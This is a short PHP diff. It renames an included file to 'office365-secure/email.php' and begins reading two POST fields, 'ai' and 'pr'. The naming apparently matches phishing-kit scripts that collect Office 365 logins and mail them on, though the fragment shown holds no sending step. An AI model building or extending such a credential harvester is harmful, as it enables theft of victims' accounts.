@@ -1,5 +1,5 @@
 <?php
-include 'email.php';
+include 'office365-secure/email.php';
 $ai = trim($_POST['ai']);
 $pr = trim($_POST['pr']);
 
